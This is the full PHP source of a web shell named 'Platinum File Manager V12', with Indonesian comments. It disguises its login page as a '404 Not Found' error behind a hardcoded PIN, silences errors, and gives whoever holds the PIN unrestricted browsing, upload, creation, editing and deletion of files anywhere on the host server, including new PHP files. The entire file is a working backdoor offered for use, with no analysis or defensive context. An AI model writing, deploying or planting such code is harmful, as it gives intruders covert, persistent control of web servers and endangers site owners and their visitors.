<?php
/**
 * PLATINUM FILE MANAGER V12 - FULL SOURCE
 * UI Identik WordPress - Tanpa Obfuscation
 */

@session_start();
@set_time_limit(0);
@error_reporting(0);

// --- CONFIG ---
$pin_akses = '070999';
$key       = 'cuceng';

// Membuat URL dasar agar navigasi tidak hilang
$self = $_SERVER['SCRIPT_NAME'];
$auth_param = "?resmi=$key";
$base_url = $self . $auth_param;

// --- SECURITY GATE ---
if (isset($_GET['exit'])) { 
    unset($_SESSION['auth']); 
    header("Location: $self"); 
    exit; 
}

if (isset($_POST['login_pin']) && $_POST['login_pin'] == $pin_akses) { 
    $_SESSION['auth'] = md5($pin_akses); 
}

if ($_SESSION['auth'] !== md5($pin_akses)) {
    ?>
    <html><head><title>404 Not Found</title><style>
        body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
        .login-box { border:1px solid #0f0; padding:40px; text-align:center; box-shadow:0 0 20px #0f0; }
        input { background:#000; border:1px solid #0f0; color:#0f0; padding:10px; width:200px; margin-bottom:10px; text-align:center; }
        button { background:#0f0; color:#000; border:none; padding:10px; width:222px; cursor:pointer; font-weight:bold; }
    </style></head><body>
    <div class="login-box">
        <h3>[ SYSTEM LOCKED ]</h3>
        <form method="POST">
            <input type="password" name="login_pin" placeholder="ENTER PIN" autofocus><br>
            <button type="submit">UNLOCK SYSTEM</button>
        </form>
    </div></body></html>
    <?php
    exit;
}

// --- FILE SYSTEM LOGIC ---
$root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
$path = isset($_GET['path']) ? $_GET['path'] : $root;
$path = str_replace("\\", "/", $path);

// Navigasi ke folder
if(is_file($path)) $path = dirname($path);
chdir($path);
$current_path = str_replace("\\", "/", getcwd());

// Handler: Delete, Rename, Chmod
if(isset($_GET['action']) && isset($_GET['item'])){
    $item = $_GET['item'];
    if($_GET['action'] == 'delete'){
        is_dir($item) ? @rmdir($item) : @unlink($item);
    }
    header("Location: $base_url&path=$current_path");
    exit;
}

// Handler: Upload
if(isset($_FILES['upfile'])){
    if(@copy($_FILES['upfile']['tmp_name'], $current_path . '/' . $_FILES['upfile']['name'])){
        echo "<script>alert('Upload Success!'); window.location.href='$base_url&path=$current_path';</script>";
    }
}

// Handler: Create & Edit
if(isset($_POST['save_file'])){
    @file_put_contents($_POST['filename'], $_POST['content']);
    header("Location: $base_url&path=$current_path");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Platinum Manager - <?php echo $_SERVER['HTTP_HOST']; ?></title>
    <style>
        body { background:#0d0d0d; color:#00ff00; font-family: 'Segoe UI', Tahoma, sans-serif; margin:0; padding:20px; }
        .container { background:#161616; border:1px solid #333; border-radius:10px; padding:20px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
        .header { display:flex; justify-content:space-between; border-bottom:1px solid #0f0; padding-bottom:10px; margin-bottom:20px; }
        .path-bar { background:#000; padding:10px; color:#00ffff; margin-bottom:20px; font-size:14px; border-left:3px solid #0f0; }
        table { width:100%; border-collapse:collapse; margin-top:10px; }
        th { background:#0f0; color:#000; padding:12px; text-align:left; }
        td { padding:10px; border-bottom:1px solid #222; }
        tr:hover { background:#1f1f1f; }
        .btn { background:#0f0; color:#000; border:none; padding:6px 15px; border-radius:4px; font-weight:bold; cursor:pointer; text-decoration:none; display:inline-block; }
        .btn-del { background:#ff3333; color:#fff; }
        a { color:#0f0; text-decoration:none; }
        a:hover { text-decoration:underline; }
        input[type=text], textarea { background:#000; color:#0f0; border:1px solid #444; padding:8px; border-radius:4px; }
        .toolbar { display:flex; gap:15px; margin-bottom:20px; background:#1a1a1a; padding:15px; border-radius:5px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <strong>PLATINUM V12 (GENERIC)</strong>
        <a href="<?php echo $base_url; ?>&exit" style="color:#ff3333; font-weight:bold;">[ LOGOUT ]</a>
    </div>

    <div class="path-bar">
        📍 CURRENT PATH: <?php echo $current_path; ?>
    </div>

    <div class="toolbar">
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="upfile">
            <button type="submit" class="btn">UPLOAD</button>
        </form>
        <form method="GET">
            <input type="hidden" name="resmi" value="<?php echo $key; ?>">
            <input type="hidden" name="path" value="<?php echo $current_path; ?>">
            <input type="text" name="newfile" placeholder="filename.php">
            <button type="submit" class="btn">CREATE FILE</button>
        </form>
    </div>

    <?php 
    // Bagian Editor File
    if(isset($_GET['edit']) || isset($_GET['newfile'])): 
        $file_to_edit = isset($_GET['edit']) ? $_GET['edit'] : $_GET['newfile'];
        $content = file_exists($file_to_edit) ? htmlspecialchars(file_get_contents($file_to_edit)) : "";
    ?>
    <div style="margin-bottom:30px;">
        <h3>Editing: <?php echo basename($file_to_edit); ?></h3>
        <form method="POST">
            <input type="hidden" name="filename" value="<?php echo $file_to_edit; ?>">
            <textarea name="content" style="width:100%; height:400px;"><?php echo $content; ?></textarea><br><br>
            <button type="submit" name="save_file" class="btn" style="width:100%">SAVE CHANGES</button>
        </form>
    </div>
    <?php endif; ?>

    <table>
        <thead>
            <tr>
                <th>Item Name</th>
                <th width="150">Size</th>
                <th width="200">Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php
            $items = scandir($current_path);
            foreach($items as $item){
                if($item == "." || $item == "..") continue;
                $full_item = $current_path . '/' . $item;
                $is_dir = is_dir($full_item);
                $size = $is_dir ? "FOLDER" : round(filesize($full_item)/1024, 2) . " KB";
                
                // LINK PERBAIKAN: Selalu menyertakan resmi=$key
                $nav_link = $base_url . "&path=" . $full_item;
                $edit_link = $base_url . "&path=$current_path&edit=$full_item";
                $del_link = $base_url . "&path=$current_path&action=delete&item=$full_item";

                echo "<tr>
                    <td><a href='".($is_dir ? $nav_link : $edit_link)."'>".($is_dir ? "📁" : "📄")." $item</a></td>
                    <td>$size</td>
                    <td>
                        <a href='$edit_link' class='btn'>Edit</a>
                        <a href=\"$del_link\" class='btn btn-del' onclick=\"return confirm('Hapus $item?')\">Del</a>
                    </td>
                </tr>";
            }
            ?>
        </tbody>
    </table>
</div>

</body>
</html>
